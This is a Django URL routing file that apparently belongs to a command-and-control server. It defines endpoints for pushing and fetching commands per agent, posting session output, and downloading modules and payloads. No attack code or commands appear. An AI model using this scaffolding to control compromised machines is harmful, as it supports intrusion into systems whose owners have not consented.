from django.urls import path
from . import views


urlpatterns = [
    path('<str:agent_identifier>/push', views.push_command, name='push_command'),
    path('<str:agent_identifier>/get', views.get_command, name='get_command'),
    path('<str:agent_identifier>/<int:session_id>/output', views.output_command, name='output_command'),
    path('modules/<str:module_name>', views.modules_download, name='modules_download'),
    path('payloads/<str:payload_name>', views.payloads_download, name='payloads_download'),
]